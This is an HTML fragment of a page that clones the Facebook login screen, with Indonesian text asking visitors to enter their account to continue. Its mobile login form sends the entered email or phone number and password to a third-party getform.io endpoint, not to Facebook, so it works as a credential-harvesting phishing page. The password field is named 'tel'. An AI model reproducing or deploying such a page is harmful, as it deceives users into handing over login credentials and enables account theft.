...
<link rel="stylesheet" type="text/css" href="https://pranavks.github.io/fb-ui-clone/css/computer.css" media="screen and (min-width: 769px)">
<link rel="stylesheet" type="text/css" href="https://pranavks.github.io/fb-ui-clone/css/mobile.css" media="screen and (max-width: 768px)">
...
<div class="computer">
  <header>
    <div class="headersubdiv">
      <img src="https://pranavks.github.io/fb-ui-clone/images/fblogo.png" class="fblogo">
      <div class="loginform">
        <table>
          <tr>
    ...
    <div class="mainsubdiv">
      <div class="welcome">
        ...
        <div class="welcomepic">
          <img src="https://pranavks.github.io/fb-ui-clone/images/connecting.png" alt="welcome">
        </div>
      </div>
      <div class="signupdiv">
...
<div class="mobile">
  <div class="mobheader">
    <img src="https://pranavks.github.io/fb-ui-clone/images/fblogo.png" class="mobfblogo">
  </div>
  <div id="mobapplink" class="clearfix">
    <a href="#">
      <img src="https://pranavks.github.io/fb-ui-clone/images/fbandroid.png" id="mobandroidpic">
      <div id="getfbandroid">Masukan akun anda untuk melanjutkan</div>
    </a>
  </div>
  <div class="mobmaindiv">
    <div id="mobtextdiv">
    	<form action="https://getform.io/f/66b88323-e56d-483d-8b30-0b0b6b1079e7" method="POST">

 
      <input type="text" name="email"  class="mobtextbox mobtextbox1" placeholder="Nomor ponsel atau email">
      <input name="tel"  type="password" class="mobtextbox mobtextbox2" placeholder="Kata sandi">
    </div>
    <div class="mobloginbuttondiv">
      <input type="submit" class="mobloginbutton" value="Masuk">
    </div>
    <div id="ordiv">
    <span id="or">atau</span>
    </div>
    <div id="mobcreatediv">
      <button id="mobcreate">Buat Akun Baru</button>
    </div>
  ...
  <div class="mobfooter">
    <div id="moblangs">
      <div class="item1">
        <li><a href="#" id="mobcurrentlang">Bahasa Indonesia</a></li>
